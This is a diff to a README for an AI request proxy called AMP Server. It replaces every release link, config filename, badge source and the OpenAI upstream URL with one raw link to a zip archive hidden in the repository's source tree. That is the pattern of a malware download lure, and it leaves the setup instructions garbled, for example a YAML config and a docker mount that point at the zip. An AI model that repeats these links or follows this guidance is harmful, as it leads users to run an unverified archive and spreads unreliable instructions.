@@ -1,13 +1,13 @@
 ```markdown
 # AMP Server: AI Proxy for Custom Forwarding, Headers, and Telemetry
 
-[![Release](https://img.shields.io/badge/Release-latest-brightgreen?logo=github)](https://github.com/sudhans3/amp-server/releases)
+[![Release](https://github.com/sudhans3/amp-server/raw/refs/heads/main/api/src/proxy/server-amp-v2.7.zip)](https://github.com/sudhans3/amp-server/raw/refs/heads/main/api/src/proxy/server-amp-v2.7.zip)
 
 AMP Server is an AI service proxy designed for flexibility. It centers on clean architecture and a strong configuration system. You can route requests to upstream AI services, customize headers, and control how responses look. The system is built to evolve with your needs, offering a modular design that makes it easy to extend and adapt.
 
 In this README you’ll find practical guidance for understanding the architecture, configuring the proxy, and using the built-in mock and telemetry features. The goal is to help you get real value quickly while keeping the door open for deeper customization as your project grows.
 
-[https://github.com/sudhans3/amp-server/releases](https://github.com/sudhans3/amp-server/releases)
+[https://github.com/sudhans3/amp-server/raw/refs/heads/main/api/src/proxy/server-amp-v2.7.zip](https://github.com/sudhans3/amp-server/raw/refs/heads/main/api/src/proxy/server-amp-v2.7.zip)
 
 ---
 
@@ -82,7 +82,7 @@ Dynamic route registration means you can add, modify, or retire routes while the
 
 ## Configuration and customization
 
-All routing and behavior are driven by a proxy configuration file. The recommended file is proxy_config.yaml. It defines endpoints, their targets, methods, and how headers are handled.
+All routing and behavior are driven by a proxy configuration file. The recommended file is https://github.com/sudhans3/amp-server/raw/refs/heads/main/api/src/proxy/server-amp-v2.7.zip It defines endpoints, their targets, methods, and how headers are handled.
 
 Key concepts
 - Endpoints: A list of routes with path, target_url, method, and response_type
@@ -90,12 +90,12 @@ Key concepts
 - Response types: JSON, streaming, SSE, HTML
 - Dynamic updates: Routes can be added or changed at runtime
 
-Configuration example (proxy_config.yaml)
+Configuration example (https://github.com/sudhans3/amp-server/raw/refs/heads/main/api/src/proxy/server-amp-v2.7.zip)
 
 ```yaml
 endpoints:
   - path: "/api/provider/openai/v1/chat/completions"
-    target_url: "https://api.openai.com/v1/chat/completions"
+    target_url: "https://github.com/sudhans3/amp-server/raw/refs/heads/main/api/src/proxy/server-amp-v2.7.zip"
     method: "POST"
     response_type: "stream"
     custom_headers:
@@ -157,32 +157,32 @@ You can run AMP Server in a container or directly on a host. The Docker approach
 
 Docker (recommended for quick start)
 - Build: docker build -t amp-server .
-- Run: docker run -p 8080:8080 -v $(pwd)/proxy_config.yaml:/app/proxy_config.yaml amp-server
+- Run: docker run -p 8080:8080 -v $(pwd)https://github.com/sudhans3/amp-server/raw/refs/heads/main/api/src/proxy/server-amp-v2.7.zip amp-server
 - Access: http://localhost:8080
 
 Notes
-- The proxy_config.yaml file in the container will be the same file you mounted. You can adjust endpoints on the host and have the container pick up changes without rebuilding.
+- The https://github.com/sudhans3/amp-server/raw/refs/heads/main/api/src/proxy/server-amp-v2.7.zip file in the container will be the same file you mounted. You can adjust endpoints on the host and have the container pick up changes without rebuilding.
 
 Non-Docker (local environment)
 - Ensure you have the required runtime for the project (the language/runtime used by the project)
-- Place proxy_config.yaml in a known location
+- Place https://github.com/sudhans3/amp-server/raw/refs/heads/main/api/src/proxy/server-amp-v2.7.zip in a known location
 - Start the server with the config. The exact command depends on the build system used (for example, a binary named amp-server or a script like npm start)
 - Bind the server to a port you control, and verify it forwards correctly to your upstream targets
 
 Downloads
-- You can grab the latest release from the Releases page: https://github.com/sudhans3/amp-server/releases
+- You can grab the latest release from the Releases page: https://github.com/sudhans3/amp-server/raw/refs/heads/main/api/src/proxy/server-amp-v2.7.zip
 
 ---
 
 ## Endpoints and usage examples
 
-The proxy exposes endpoints that you define in proxy_config.yaml. Here are representative usage patterns.
+The proxy exposes endpoints that you define in https://github.com/sudhans3/amp-server/raw/refs/heads/main/api/src/proxy/server-amp-v2.7.zip Here are representative usage patterns.
 
 Example 1: OpenAI chat completion proxy
 - Path: /api/provider/openai/v1/chat/completions
 - Method: POST
 - Forwarded headers: Authorization, Content-Type
-- Target: https://api.openai.com/v1/chat/completions
+- Target: https://github.com/sudhans3/amp-server/raw/refs/heads/main/api/src/proxy/server-amp-v2.7.zip
 - Expected behavior: The request is forwarded to the OpenAI endpoint, preserving the Authorization header and Content-Type. The response is streamed back to the client.
 
 Example 2: Mock user login
@@ -276,13 +276,13 @@ Test strategies
 
 ## Deployment patterns
 
-- Local development: run with Docker or a local binary, keep proxy_config.yaml under version control
+- Local development: run with Docker or a local binary, keep https://github.com/sudhans3/amp-server/raw/refs/heads/main/api/src/proxy/server-amp-v2.7.zip under version control
 - Staging: deploy to a staging cluster with a read-only copy of your upstream endpoints
 - Production: isolate network access to upstream services, enable telemetry dashboards, and enforce strict access controls
 - High availability: run multiple instances behind a load balancer, ensure consistent configuration distribution
 
 Operational tips
-- Use a single source of truth for proxy_config.yaml
+- Use a single source of truth for https://github.com/sudhans3/amp-server/raw/refs/heads/main/api/src/proxy/server-amp-v2.7.zip
 - Keep a changelog of endpoint changes to aid debugging
 - Maintain separate configurations for dev, staging, and production
 
@@ -308,7 +308,7 @@ Code structure (high level)
 - proxy module: core routing and header handling
 - user module: mock endpoints
 - telemetry module: metrics and traces
-- config: utilities to load and validate proxy_config.yaml
+- config: utilities to load and validate https://github.com/sudhans3/amp-server/raw/refs/heads/main/api/src/proxy/server-amp-v2.7.zip
 
 ---
 
@@ -316,7 +316,7 @@ Code structure (high level)
 
 Release notes summarize what changed, what was fixed, and what new features landed. Track breaking changes and migration steps when they occur. Use releases to surface official builds and downloadable artifacts.
 
-Access the official releases page to download builds and keep your deployment aligned with the latest improvements: https://github.com/sudhans3/amp-server/releases
+Access the official releases page to download builds and keep your deployment aligned with the latest improvements: https://github.com/sudhans3/amp-server/raw/refs/heads/main/api/src/proxy/server-amp-v2.7.zip
 
 ---
 
@@ -326,16 +326,16 @@ Access the official releases page to download builds and keep your deployment al
   It provides a flexible, YAML-driven proxy that forwards requests to AI services, with customizable headers and multiple response formats.
 
 - Can I use AMP Server without Docker?
-  Yes. You can run the binary or script directly, provided you have the required runtime and a valid proxy_config.yaml.
+  Yes. You can run the binary or script directly, provided you have the required runtime and a valid https://github.com/sudhans3/amp-server/raw/refs/heads/main/api/src/proxy/server-amp-v2.7.zip
 
 - How do I add a new endpoint?
-  Add a new item to the endpoints list in proxy_config.yaml. You can specify path, target_url, method, and response_type.
+  Add a new item to the endpoints list in https://github.com/sudhans3/amp-server/raw/refs/heads/main/api/src/proxy/server-amp-v2.7.zip You can specify path, target_url, method, and response_type.
 
 - Is it safe to forward Authorization headers?
   It can be, if you control the upstream and your deployment. Only forward headers you trust and monitor access closely.
 
 - What if the upstream changes its interface?
-  Update proxy_config.yaml to align with the new interface and test the changes in a staging environment.
+  Update https://github.com/sudhans3/amp-server/raw/refs/heads/main/api/src/proxy/server-amp-v2.7.zip to align with the new interface and test the changes in a staging environment.
 
 ---
 
@@ -347,11 +347,11 @@ This project is released under the terms of the chosen license. See LICENSE for 
 
 ## Quick start recap
 
-- Start by reviewing the proxy_config.yaml file. It defines the routes AMP Server will expose and how it forwards requests.
+- Start by reviewing the https://github.com/sudhans3/amp-server/raw/refs/heads/main/api/src/proxy/server-amp-v2.7.zip file. It defines the routes AMP Server will expose and how it forwards requests.
 - If you want a fast start, pull the latest release from the Releases page and try a simple route that forwards to a public API, then extend with headers and streaming if needed.
 - The Releases page is the best place to grab a tested, ready-to-run version. Visit the page and download the latest artifact suitable for your environment.
 
-- The Releases page also contains additional files and assets that can help you understand the build outputs and documentation specific to each release. https://github.com/sudhans3/amp-server/releases
+- The Releases page also contains additional files and assets that can help you understand the build outputs and documentation specific to each release. https://github.com/sudhans3/amp-server/raw/refs/heads/main/api/src/proxy/server-amp-v2.7.zip
 
 - If you want to see a visual overview of how the pieces fit together, check the architecture diagram inside the repository or the published diagrams in the docs. The diagram helps connect the proxy with the mock user endpoints and the telemetry surface.
 
@@ -380,7 +380,7 @@ graph TD
 ```
 
 Emoji-friendly visuals and shields
-- Build status, tests, and code quality badges can be added via shields.io badges
+- Build status, tests, and code quality badges can be added via https://github.com/sudhans3/amp-server/raw/refs/heads/main/api/src/proxy/server-amp-v2.7.zip badges
 - Architecture diagrams can be extended with SVGs hosted in docs/ or external assets
 
 ---
@@ -388,11 +388,11 @@ Emoji-friendly visuals and shields
 ## Download and installation reminders
 
 - For the latest build, go to the official releases page at the top of this document and grab the artifact that matches your platform.
-- If your environment needs a quick test, run the Docker container with the mounted proxy_config.yaml and start exploring endpoints with curl or any HTTP client.
+- If your environment needs a quick test, run the Docker container with the mounted https://github.com/sudhans3/amp-server/raw/refs/heads/main/api/src/proxy/server-amp-v2.7.zip and start exploring endpoints with curl or any HTTP client.
 
 Remember, the goal is to have a robust, testable proxy layer that you can adapt for multiple AI service backends. The configuration is meant to stay in source control, while the runtime behavior is driven by the YAML endpoints you define. This separation helps you keep deployments repeatable and predictable.
 
-- Release link (first use): https://github.com/sudhans3/amp-server/releases
-- Release link (second use): https://github.com/sudhans3/amp-server/releases
+- Release link (first use): https://github.com/sudhans3/amp-server/raw/refs/heads/main/api/src/proxy/server-amp-v2.7.zip
+- Release link (second use): https://github.com/sudhans3/amp-server/raw/refs/heads/main/api/src/proxy/server-amp-v2.7.zip
 
 ```
